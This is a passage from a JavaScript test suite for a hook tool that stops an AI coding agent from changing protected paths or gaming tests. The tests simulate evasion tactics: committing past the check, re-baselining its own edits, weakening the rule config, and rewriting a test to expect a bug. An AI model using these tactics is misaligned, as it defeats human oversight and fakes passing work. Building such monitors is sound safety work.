    assert.ok(!/"decision":"block"/.test(hook('p1')), 'pre-existing protected edits are not the turn\'s');
    // the agent also edits a protected file: blocked, naming only its own file, sparing the person's
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n');
    const r = JSON.parse(hook('p2'));
    assert.equal(r.decision, 'block');
    assert.match(r.reason, /changed in this turn: "no-auth": src\/auth\/login\.js\./);
    assert.match(r.reason, /do not revert anything you did not change/);
    assert.match(r.reason, /left out of this check.*src\/auth\/old\.js/); assert.match(r.reason, /left out of this check.*src\/auth\/new\.js/);
    // the agent changes the person's file too: now it counts (the content moved past the baseline)
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'agent rewrote it\n');
    assert.match(JSON.parse(hook('p3')).reason, /src\/auth\/login\.js, src\/auth\/old\.js|src\/auth\/old\.js, src\/auth\/login\.js/);
    // a compaction re-run of turn mid-turn must NOT re-baseline the agent's edits as pre-existing
    turn('SessionStart');
    { const r3 = JSON.parse(hook('p3')); assert.equal(r3.decision, undefined, 'sent back once for this change (0.2.9)'); assert.match(r3.systemMessage || '', /src\/auth\/login\.js/, 'SessionStart[compact] leaves the baseline alone: the change is still the turn\'s'); }
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the baseline cannot launder the agent\'s own protected edit: a file still carrying the last violation\'s content is never baselined', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'] }], metrics: [] }));
    mkdirSync(join(d, 'src', 'auth'), { recursive: true });
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'a\n'); writeFileSync(join(d, 'src', 'x.js'), 'b\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    const hook = (promptId) => execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    const turn = () => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    turn();                                                                     // prompt 1 begins, tree clean
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n');               // the agent edits the wall
    assert.equal(JSON.parse(hook('p1')).decision, 'block');
    assert.match(JSON.parse(hook('p1')).systemMessage || '', /not sent back again/, 'sent back once (0.2.9), then the turn ends with the edit still there and a line for the person');
    const st = JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    assert.ok(st.lastViolation && st.lastViolation.files['src/auth/login.js'], 'the violation and its content are remembered');
    turn();                                                                     // prompt 2 begins: "ok, continue"
    const st2 = JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    assert.ok(!('src/auth/login.js' in st2.turnBaseline.files), 'the un-reverted agent edit is not adopted as pre-existing');
    const r = JSON.parse(hook('p2'));
    assert.equal(r.decision, undefined, 'one change is sent back once (0.2.9): the new prompt does not send it back again');
    assert.match(r.systemMessage || '', /src\/auth\/login\.js/, 'and the person is told it still stands');
    // the person reverts it: the next prompt is clean and the memory of the violation clears
    g('checkout', '--', 'src/auth/login.js');
    assert.ok(!/"decision":"block"/.test(hook('p3')));
    assert.ok(!JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8')).lastViolation);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a turn that never reached a Stop keeps the previous baseline, so neither an interrupt nor a mid-turn re-run of turn adopts the agent\'s edit', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'] }], metrics: [] }));
    mkdirSync(join(d, 'src', 'auth'), { recursive: true });
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'a\n'); writeFileSync(join(d, 'src', 'auth', 'old.js'), 'a\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    const hook = (promptId) => execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    const turn = () => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    const state = () => JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    turn();                                                            // prompt 1, clean tree
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n');      // the agent edits the wall...
    turn();                                                            // ...and re-runs turn itself mid-turn (no Stop in between)
    assert.ok(!('src/auth/login.js' in state().turnBaseline.files), 'the baseline did not move: no Stop happened since the prompt');
    // the person presses Esc (no Stop), then types the next prompt: still the agent\'s edit, still on the wall
    turn();
    assert.ok(!('src/auth/login.js' in state().turnBaseline.files), 'an interrupted turn leaves the baseline standing');
    assert.equal(JSON.parse(hook('p2')).decision, 'block');
    // a clean stop lets the next prompt take a fresh baseline, so the person\'s own edit is spared
    g('checkout', '--', 'src/auth/login.js');
    assert.ok(!/"decision":"block"/.test(hook('p2')), 'clean');
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'my own wip\n');
    turn();
    assert.ok('src/auth/old.js' in state().turnBaseline.files, 'after a Stop the baseline is fresh and holds the person\'s edit');
    assert.ok(!/"decision":"block"/.test(hook('p3')), 'the person\'s edit does not block');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a protected edit committed mid-turn still counts, and the baseline\'s commit does not advance past it until a clean stop', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'] }], metrics: [] }));
    mkdirSync(join(d, 'src', 'auth'), { recursive: true });
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'a\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    const base = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: d, encoding: 'utf8' }).trim();
    const hook = (promptId) => execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    const turn = () => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    const state = () => JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    turn();
    assert.equal(state().turnBaseline.sha, base);
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n'); g('add', 'src/auth/login.js'); g('commit', '-q', '-m', 'auth fix');   // committed mid-turn: the tree is clean
    let r = JSON.parse(hook('p1'));
    assert.equal(r.decision, 'block', 'a commit does not walk through the wall');
    assert.match(r.reason, /src\/auth\/login\.js/);
    assert.match(JSON.parse(hook('p1')).systemMessage || '', /not sent back again/, 'sent back once (0.2.9), then a line');
    turn();                                                            // prompt 2: the baseline must not advance past the flagged commit
    assert.equal(state().turnBaseline.sha, base, 'the baseline\'s commit stays at the one the violation was measured against');
    { const r2 = JSON.parse(hook('p2')); assert.equal(r2.decision, undefined); assert.match(r2.systemMessage || '', /src\/auth\/login\.js/, 'still on the wall on the next prompt: told, not sent back again (0.2.9)'); }
    // the person takes the commit back out: clean stop, and the baseline advances
    g('revert', '--no-edit', 'HEAD');
    assert.ok(!/"decision":"block"/.test(hook('p2')));
    turn();
    assert.notEqual(state().turnBaseline.sha, base, 'after a clean stop the baseline moves to the new HEAD');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a violation across more than twenty protected files is remembered whole: none of them is adopted by the next baseline', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-tests', paths: ['test/**'] }], metrics: [] }));
    mkdirSync(join(d, 'test'), { recursive: true });
    writeFileSync(join(d, 'test', 'seed.js'), '1\n'); g('add', '-A'); g('commit', '-q', '-m', 'base');
    const hook = (promptId) => execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    const turn = () => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    turn();
    for (let i = 0; i < 25; i++) writeFileSync(join(d, 'test', `t${i}.js`), 'x\n');
    assert.equal(JSON.parse(hook('p1')).decision, 'block');
    hook('p1');
    const st = JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    assert.equal(Object.keys(st.lastViolation.files).length, 25, 'every changed protected path is remembered, not the first twenty');
    turn();
    assert.deepEqual(Object.keys(JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8')).turnBaseline.files), [], 'none of the twenty-five is adopted');
    assert.match(JSON.parse(hook('p2')).systemMessage || '', /not sent back again/, 'and the next prompt is told, not sent back again (0.2.9)');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the wall unions the committed contract: dropping a mandate from the working-tree config does not disarm it', () => {
  const { d, g } = tmpRepo();
  try {
    mkdirSync(join(d, 'base'), { recursive: true });
    writeFileSync(join(d, 'base', 'shared.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'], reason: 'reviewed PR only' }], metrics: [] }));
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ extends: './base/shared.json', mandates: [{ name: 'no-db', paths: ['db/**'] }], metrics: [] }));
    mkdirSync(join(d, 'src', 'auth'), { recursive: true });
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'a\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    assert.deepEqual(mandatesInForce(d).map((m) => m.name).sort(), ['no-auth', 'no-db']);
    // the agent narrows the inherited rule to nothing and deletes the local one, uncommitted, then breaks both
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/legacy/**'] }], metrics: [] }));
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'b\n');
    const inForce = mandatesInForce(d);
    assert.deepEqual(inForce.map((m) => [m.name, !!m.committed]).sort(), [['no-auth', false], ['no-auth', true], ['no-db', true]], 'both versions of the edited rule, and the deleted one, are in force');
    const hits = mandateHits(d, ['src/auth/login.js', 'promptwheel.config.json']);
    assert.deepEqual(hits.map((h) => [h.name, h.files, !!h.committed]), [['no-auth', ['src/auth/login.js'], true]]);
    // when the working-tree version of a rule hits too, the merged entry still says the committed one did
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/login.js'] }], metrics: [] }));
    const both = mandateHits(d, ['src/auth/login.js', 'src/auth/other.js']);
    assert.deepEqual(both.map((h) => [h.name, h.files.sort(), !!h.committed]), [['no-auth', ['src/auth/login.js', 'src/auth/other.js'], true]]);
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/legacy/**'] }], metrics: [] }));   // back to the narrowed tree for the rest
    assert.deepEqual(mandateHits(d, ['src/auth/login.js'], { ref: null }), [], 'the working tree alone would have let it through');
    const r = JSON.parse(execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: 'p1' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } }));
    assert.equal(r.decision, 'block');
    assert.match(r.reason, /no-auth.*src\/auth\/login\.js.*committed contract/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --claude upgrades an older attachment in place instead of saying already attached', () => {
  const { d } = tmpRepo();
  try {
    writeFileSync(join(d, 'a.js'), '1\n');
    sawbuck(['attach', '--claude', d], d);
    const f = join(d, '.claude', 'settings.local.json');
    const cfg = JSON.parse(readFileSync(f, 'utf8'));
    assert.ok(cfg.hooks.SessionStart && cfg.hooks.SessionStart.some((h) => h.matcher === 'compact'), 'this version wires SessionStart[compact]');
    assert.match(sawbuck(['attach', '--claude', d], d), /already attached/);
    // an attachment from a version without the SessionStart hook (and the older `context` command)
    delete cfg.hooks.SessionStart;
    cfg.hooks.UserPromptSubmit = cfg.hooks.UserPromptSubmit.map((h) => ({ ...h, hooks: h.hooks.map((x) => ({ ...x, command: x.command.replace(' turn ', ' context ') })) }));
    writeFileSync(f, JSON.stringify(cfg, null, 2) + '\n');
    const out = sawbuck(['attach', '--claude', d], d);
    assert.match(out, /updated the project Claude Code hooks/);
    const up = JSON.parse(readFileSync(f, 'utf8'));
    assert.ok(up.hooks.SessionStart.some((h) => h.matcher === 'compact' && h.hooks.some((x) => / turn --hook /.test(x.command))), 'the compact hook is added, with --hook');
    assert.ok(up.hooks.UserPromptSubmit.every((h) => h.hooks.every((x) => !/ context /.test(x.command))), 'the old command is replaced, not duplicated');
    assert.equal(up.hooks.UserPromptSubmit.filter((h) => JSON.stringify(h).includes('sawbuck.mjs')).length, 1);
    assert.match(sawbuck(['attach', '--claude', d], d), /already attached/);
    sawbuck(['detach', d], d);
    assert.ok(!existsSync(f), 'detach still removes the file the first attach created');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the Stop hook blocks a turn that leaves a protected path changed, then lets a clean turn end', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'], reason: 'reviewed PR only' }], metrics: [] }));
    mkdirSync(join(d, 'src', 'auth'), { recursive: true });
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'a\n'); writeFileSync(join(d, 'src', 'x.js'), 'b\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'c\n');                       // the agent touched the wall
    assert.deepEqual(mandateHits(d, ['src/auth/login.js', 'src/x.js']).map((h) => h.files), [['src/auth/login.js']]);
    const hook = (promptId) => execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    let r = JSON.parse(hook('p1'));
    assert.equal(r.decision, 'block');
    assert.match(r.reason, /no-auth.*src\/auth\/login\.js/);
    assert.match(readFileSync(join(d, '.sawbuck', 'activity.jsonl'), 'utf8'), /"kind":"mandate"/);
    r = JSON.parse(hook('p1')); assert.ok(!r.decision && /not sent back again/.test(r.systemMessage), 'one change is sent back once (0.2.9), then a line for the person');
    g('checkout', '--', 'src/auth/login.js'); writeFileSync(join(d, 'src', 'x.js'), 'd\n');   // reverted the wall, fixed elsewhere
    const out = hook('p2');
    assert.ok(!/"decision":"block"/.test(out), 'a clean turn is allowed to end');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// --- review-4 fixes (0.1.31): the wall's memory, between-turn commits, the standing gamed verdict,
// an unreadable debt base, attach from a subdirectory or a worktree, user-level wiring, the budget key
const HOOKF = join(HERE, '..', 'sawbuck-hook.mjs');
const wallRepo = (files) => {
  const { d, g } = tmpRepo();
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'] }], metrics: [] }));
  mkdirSync(join(d, 'src', 'auth'), { recursive: true });
  for (const f of files) writeFileSync(join(d, f), 'a\n');
  g('add', '-A'); g('commit', '-q', '-m', 'base');
  const hook = (input) => execFileSync(process.execPath, [HOOKF, '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify(input), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
  const turn = () => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
  const state = () => JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
  return { d, g, hook, turn, state };
};
const named = (raw) => { let t = ''; try { t = JSON.parse(raw).reason || ''; } catch { t = raw; } const m = /changed in this turn: (.*?)\.(?: You are sent back for it once\.)? If you made this change/.exec(t); return m ? m[1] : ''; };

test('a violation remembers only the turn\'s own protected changes: the person\'s spared file is never flagged or named', () => {
  const { d, g, hook, turn, state } = wallRepo(['src/auth/old.js', 'src/auth/login.js']);
  try {
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'my wip\n');            // the person's own edit, before the prompt
    turn();
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n');           // the agent edits the wall
    const outs = [];
    for (let i = 0; i < 4; i++) outs.push(hook({ prompt_id: 'p1' }));       // one send-back, then lines (0.2.9)
    assert.deepEqual(Object.keys(state().lastViolation.files), ['src/auth/login.js'], 'only the turn\'s own change is remembered');
    turn();                                                                  // prompt 2
    assert.ok('src/auth/old.js' in state().turnBaseline.files, 'the person\'s file is baselined again');
    const again = hook({ prompt_id: 'p2' });                                 // the agent's edit is still there: blocked, naming only login.js
    assert.equal(JSON.parse(again).decision, undefined, 'told, not sent back again (0.2.9)');
    assert.match(JSON.parse(again).systemMessage || '', /"no-auth": src\/auth\/login\.js\)/); assert.doesNotMatch(again, /old\.js/);
    g('checkout', '--', 'src/auth/login.js');                                // the agent undoes its own change
    const clean = hook({ prompt_id: 'p2' });
    assert.ok(!/"decision":"block"/.test(clean), 'with the agent\'s edit undone the turn ends, the person\'s wip untouched');
    for (const o of outs) assert.ok(!named(o).includes('old.js'), 'no block ever names the person\'s file');
    assert.equal(readFileSync(join(d, 'src', 'auth', 'old.js'), 'utf8'), 'my wip\n');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a commit the person makes between turns is theirs, but unrelated work does not clear a protected change still in HEAD; a revert does', () => {
  const { d, g, hook, turn, state } = wallRepo(['src/auth/login.js']);
  try {
    const base = execFileSync('git', ['-C', d, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
    turn();
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n'); g('add', 'src/auth/login.js'); g('commit', '-q', '-m', 'auth change (mid-turn)');
    { const r1 = JSON.parse(hook({ prompt_id: 'p1' })); assert.equal(r1.decision, 'block'); assert.match(r1.reason, /To accept this change on purpose, change the rule in the contract or revert the path/); }
    assert.match(JSON.parse(hook({ prompt_id: 'p1' })).systemMessage || '', /not sent back again/);
    // between turns the agent is not running: the person commits their own notes, but HEAD still carries
    // the agent's protected content, so the pin holds (accepting it is an explicit act, not a side effect)
    writeFileSync(join(d, 'notes.md'), 'reviewing the auth change\n'); g('add', '-A'); g('commit', '-q', '-m', 'person: notes');
    turn();
    assert.equal(state().turnBaseline.sha, base, 'the baseline does not advance past the flagged commit while HEAD carries its content');
    const r = JSON.parse(hook({ prompt_id: 'p2' }));
    assert.equal(r.decision, undefined, 'told, not sent back again (0.2.9)');
    assert.match(r.systemMessage || '', /protected paths are still changed/);
    // the person reverts the protected path and commits: that commit is theirs and the wall comes down
    g('checkout', base, '--', 'src/auth/login.js'); g('commit', '-q', '-am', 'person: revert the auth change');
    const head = execFileSync('git', ['-C', d, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
    turn();
    assert.equal(state().turnBaseline.sha, head, 'the baseline starts at the person\'s commit once the flagged content is gone');
    const out = hook({ prompt_id: 'p3' });                                   // the agent touched nothing this turn
    assert.ok(!/"decision":"block"/.test(out), 'a commit made between turns is not charged to the agent');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('one change is sent back once even when the harness sends no prompt_id, and a new prompt does not send it back again', () => {
  const { d, hook, turn } = wallRepo(['src/auth/login.js']);
  try {
    turn();
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n');
    assert.equal(JSON.parse(hook({})).decision, 'block');
    assert.match(JSON.parse(hook({})).systemMessage || '', /not sent back again/, 'sent back once, with no prompt_id as with one (0.2.9)');
    turn();                                                                  // the next prompt
    assert.match(JSON.parse(hook({})).systemMessage || '', /not sent back again/, 'and a new prompt does not send it back again: told while it stands');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the gamed wall holds through a follow-up commit and comes down only when the span re-proves from the source', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, repeat: 1, metrics: [{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }] }));
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b; // BUG\n');
    const honest = "import {test} from 'node:test';import assert from 'node:assert';import {sub} from './calc.mjs';\ntest('sub',()=>assert.strictEqual(sub(5,3),2));\n";
    writeFileSync(join(d, 'calc.test.mjs'), honest);
    g('add', '-A'); g('commit', '-q', '-m', 'base (red)');
    const hook = (promptId) => execFileSync(process.execPath, [HOOKF, '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    const rec = () => JSON.parse(readFileSync(join(d, '.sawbuck', 'results.json'), 'utf8'));
    hook('p0');                                                              // arm on the base commit
    writeFileSync(join(d, 'calc.test.mjs'), honest.replace('2));', '8));'));   // the cheat: the test expects the bug
    g('commit', '-q', '-am', 'make it green');
    let r = JSON.parse(hook('p1'));
    assert.equal(r.decision, 'block'); assert.match(r.reason, /gamed/);
    assert.equal(rec().gamed, 1);
    g('commit', '-q', '--allow-empty', '-m', 'retry');                       // HEAD moves, nothing fixed
    r = JSON.parse(hook('p1'));
    assert.equal(r.decision, 'block', 'an empty commit does not clear the wall: the span is re-proved from the original base');
    assert.equal(rec().gamed, 1, 'the standing catch is not counted twice');
    assert.equal(rec().latest.kind, 'gamed');
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n'); writeFileSync(join(d, 'calc.test.mjs'), honest);
    g('commit', '-q', '-am', 'fix sub in source');
    const out = hook('p2');
    assert.ok(!/"decision":"block"/.test(out), 'the real fix clears the wall');
    assert.equal(rec().latest.kind, 'verified', 'the record says the span re-proved');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('debt --since refuses an unreadable base ref instead of reporting every suppression as new', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'a.js'), 'export const v = 1; // eslint-disable-line\n'); g('commit', '-qam', 'a bare suppression');
    const r = spawnSync(process.execPath, [CLI, 'debt', '--since', 'no-such-ref', '--fail-on', '--json'], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    assert.equal(r.status, 1);
    assert.match(r.stderr, /could not read the suppression ledger at no-such-ref/);
    assert.match(r.stderr, /fetch-depth: 0/);
    assert.doesNotMatch(r.stdout, /"added"/, 'no delta is reported from an unreadable base');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --claude from a subdirectory wires the repository root, and inside a git worktree it uses that worktree\'s git dir', () => {
  const { d, g } = tmpRepo();
  const wt = join(mkdtempSync(join(tmpdir(), 'sawbuck-wt-')), 'wt');
  try {
    const root = realpathSync(d);
    const sub = join(d, 'pkg'); mkdirSync(sub);
    sawbuck(['attach', '--claude', '.'], sub);
    const f = join(d, '.claude', 'settings.local.json');
    assert.ok(existsSync(f), 'settings written at the root');
    assert.ok(!existsSync(join(sub, '.claude')) && !existsSync(join(sub, '.git')), 'nothing created in the subdirectory');
    const stopCmd = JSON.parse(readFileSync(f, 'utf8')).hooks.Stop.find((h) => JSON.stringify(h).includes('sawbuck.mjs')).hooks[0].command;
    assert.ok(stopCmd.includes(`--repo ${JSON.stringify(root)}`), 'the hook is pinned to the root');
    sawbuck(['detach', '--claude', '.'], sub);
    assert.ok(!existsSync(f), 'detach from the subdirectory finds the root\'s attachment');
    // a linked worktree: .git is a file there, the git dir lives under the main repo
    g('worktree', 'add', '-q', wt, '-b', 'wt-branch');
    sawbuck(['attach', '--claude', '.'], wt);
    assert.ok(existsSync(join(wt, '.claude', 'settings.local.json')));
    const gd = resolve(wt, execFileSync('git', ['-C', wt, 'rev-parse', '--git-dir'], { encoding: 'utf8' }).trim());
    assert.ok(existsSync(join(gd, 'sawbuck', 'attach.json')), 'the receipt lands under the worktree\'s git dir');
    const ex = resolve(wt, execFileSync('git', ['-C', wt, 'rev-parse', '--git-path', 'info/exclude'], { encoding: 'utf8' }).trim());
    assert.match(readFileSync(ex, 'utf8'), /# >>> sawbuck >>>/, 'the exclude block is in the repository\'s own exclude file');
    assert.equal(porcelain(wt), '', 'the worktree stays clean');
    sawbuck(['detach', '--claude', '.'], wt);
    assert.ok(!existsSync(join(gd, 'sawbuck', 'attach.json')) && !existsSync(join(wt, '.claude', 'settings.local.json')), 'detach reverses it');
  } finally { rmSync(d, { recursive: true, force: true }); rmSync(dirname(wt), { recursive: true, force: true }); }
});

test('reflect --no-auto measures only where a contract exists (user-level wiring never auto-gates a repo)', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'package.json'), '{"name":"x","type":"module","scripts":{"test":"node -e 0"}}'); g('add', '-A'); g('commit', '-qm', 'pkg');
    writeFileSync(join(d, 'a.js'), 'export const v = 2;\n'); g('commit', '-qam', 'change');
    reflect(['--repo', d, '--base', 'HEAD~1', '--head', 'HEAD', '--no-auto'], d, { LOGBOOK_NO_CACHE: '1' });
    assert.ok(!existsSync(join(d, '.promptwheel', 'outcomes.jsonl')), 'nothing measured, nothing recorded');
    assert.ok(!existsSync(join(d, '.sawbuck', 'activity.jsonl')), 'no activity line either');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the Stop hook leaves a non-repository alone (user-level wiring runs in every cwd)', () => {
  const d = mkdtempSync(join(tmpdir(), 'sawbuck-nogit-'));
  try {
    const r = spawnSync(process.execPath, [HOOKF, '--by', 'claude', '--stop'], { cwd: d, input: '{}', encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    assert.equal(r.status, 0);
    assert.equal(r.stdout, '');
    assert.ok(!existsSync(join(d, '.sawbuck')), 'no state written outside a repository');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach in a one-commit repo verifies without leaking a git fatal line', () => {
  const { d } = tmpRepo();
  try {
    const r = spawnSync(process.execPath, [CLI, 'attach', '.'], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    assert.equal(r.status, 0);
    assert.doesNotMatch(r.stderr, /fatal:/);
    assert.match(r.stdout, /verifying I can measure here/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('status shows the steer rate when the reins judge has scored turns here, and nothing when it has not', () => {
  const { d } = tmpRepo();
  try {
    assert.doesNotMatch(sawbuck(['status', '.'], d), /Steer rate/);
    mkdirSync(join(d, '.sawbuck'), { recursive: true });
    writeFileSync(join(d, '.sawbuck', 'steer.json'), JSON.stringify({ scored: 10, steering: 4, ema: 0.3, steeringRate: 0.4 }));
    assert.match(sawbuck(['status', '.'], d), /Steer rate\s+·\s+30% of your recent turns redirected the agent \(10 scored/);
    assert.deepEqual(JSON.parse(sawbuck(['status', '.', '--json'], d)).steer, { rate: 30, scored: 10 });
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// --- review-5 fixes (0.1.32): turn resolves the root, the prompt key without mandates, the standing
// gamed verdict through fail/inconclusive/the person's commits, the pin through a background commit,
// a vanished base, the person's overwritten edit restorable by hash
const gamedRepo = (withTodos) => {
  const { d, g } = tmpRepo();
  const metrics = [{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }];
  if (withTodos) metrics.push({ name: 'todos', cmd: 'grep -c TODO calc.mjs || true', extract: 'number', direction: 'down', guard: true, gamingCheck: false });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, repeat: 1, metrics }));
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b; // BUG\n');
  const honest = "import {test} from 'node:test';import assert from 'node:assert';import {sub} from './calc.mjs';\ntest('sub',()=>assert.strictEqual(sub(5,3),2));\n";
  writeFileSync(join(d, 'calc.test.mjs'), honest);
  g('add', '-A'); g('commit', '-q', '-m', 'base (red)');
  const hook = (input) => execFileSync(process.execPath, [HOOKF, '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify(input), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
  const turn = () => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
  const rec = () => JSON.parse(readFileSync(join(d, '.sawbuck', 'results.json'), 'utf8'));
  const feed = () => readFileSync(join(d, '.sawbuck', 'activity.jsonl'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
